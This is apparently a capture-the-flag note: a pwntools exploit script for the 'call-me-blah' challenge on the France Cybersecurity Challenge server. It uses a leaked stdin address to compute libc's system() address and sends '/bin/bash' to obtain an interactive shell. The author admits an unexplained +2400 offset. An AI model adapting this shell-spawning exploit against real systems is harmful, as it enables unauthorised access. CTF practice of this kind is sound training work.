c
Everything was logical, except for that offset (+2400) and (+560) in local.
I have to find why...
```python
from pwn import *

LOCAL_FILE_PATH: str = "./pwn/call-me-blah"
REMOTE_SERVER = "challenges.france-cybersecurity-challenge.fr"
REMOTE_PORT = 2103

def pwn_call_me_blah(proc):
    addr = proc.recvuntil(b"\n")
    libc=ELF("pwn/libc-2.36.so")
    system_addr = libc.sym["system"]
    print("system_addr:", hex(system_addr))

    stdin_addr = libc.sym["stdin"]
    print("stdin_addr:", hex(stdin_addr))
    
    print("diff=", hex(stdin_addr-system_addr))

    real_stdinaddr = int(addr[:-1], 16)
    print("current stdin addr:", hex(real_stdinaddr))

    libc_base = real_stdinaddr - stdin_addr
    print("libc_base:", hex(libc_base))

    real_systemaddr = libc_base + system_addr +2400 # + 560
    print("current system addr:", hex(real_systemaddr))

    payload = b""
    payload += bytes(str(real_systemaddr), "ASCII")

    # Send the payload
    print("sending:", payload)
    proc.sendline(payload)

    payload = b"/bin/bash"
    proc.sendline(payload)
    print("sending:", payload)
    proc.interactive()
    res = proc.recvall(timeout=2)
    print(bytes.decode(res))

def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_call_me_blah(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_call_me_blah(proc)

def main():
    #run_bin_local(LOCAL_FILE_PATH)
    run_remote()

if __name__ == '__main__':
    main()

```